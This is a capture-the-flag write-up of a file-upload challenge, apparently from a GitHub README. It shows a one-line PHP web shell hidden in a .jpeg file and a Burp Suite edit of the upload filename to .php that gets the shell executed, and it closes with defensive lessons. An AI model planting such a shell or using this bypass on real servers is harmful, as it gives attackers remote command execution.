## 🧩 Solution to the Challenge

I began by analyzing the **HTML source code** of the page containing the file upload form. Specifically, I looked at the accepted file types and noticed that the input field allowed only files with the **`.jpeg`** extension.

<img width="823" height="211" alt="Capture d’écran 2025-07-30 à 15 29 19" src="https://github.com/user-attachments/assets/a597f2bd-27b5-4a4d-be82-f215dd1a9df5" />

### 🔍 Initial Observations:

* I suspected that server-side validation might also be weak or misconfigured.

### 🧪 Bypass Strategy:

To test this, I created a file named `shell.jpeg`, but instead of using a real image, I placed **PHP code** inside it:

```php
<?php system($_GET["cmd"]); ?>
```

* I uploaded this `.jpeg` file directly through the form.
* On the surface, it was accepted, but the server didn't seem to interpret it as PHP yet.
<img width="1278" height="657" alt="Capture d’écran 2025-07-30 à 15 40 19" src="https://github.com/user-attachments/assets/7b3a3b07-d324-4446-817e-19084126bfd0" />
<img width="1436" height="757" alt="Capture d’écran 2025-07-30 à 15 40 48" src="https://github.com/user-attachments/assets/ff32c44f-efcf-40cc-bad7-1839d5b31ff3" />


### 🕵️ Manipulating the Request with Burp Suite:

Using **Burp Suite**, I intercepted the `POST` request responsible for the file upload. In the request body, I found the part that included the file metadata:

```
Content-Disposition: form-data; name="file"; filename="shell.jpeg"
```

<img width="1089" height="742" alt="Capture d’écran 2025-07-30 à 15 44 17" src="https://github.com/user-attachments/assets/1f9336b0-6f60-402f-a063-5077a2ebb8b2" />


I modified this line to:

```
filename="shell.php"
```

This tricked the server into saving the file with a `.php` extension instead of `.jpeg`.

<img width="1415" height="728" alt="Capture d’écran 2025-07-30 à 15 45 06" src="https://github.com/user-attachments/assets/2550a1ab-7bcd-42c7-bf8e-56b232c10b98" />

* Result:

  ```
  FLAG: 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
  ```

---

## 🏁 Conclusion:

The challenge exploited a **weak server-side file validation system**. Although the UI restricted uploads to `.jpeg`, the server trusted the filename from the POST request without rechecking it.

By modifying the filename to `.php` in Burp Suite, I was able to upload and execute a PHP webshell.

This kind of vulnerability emphasizes the importance of:

* Validating file types **server-side**
* Sanitizing file extensions
* Preventing execution in upload directories
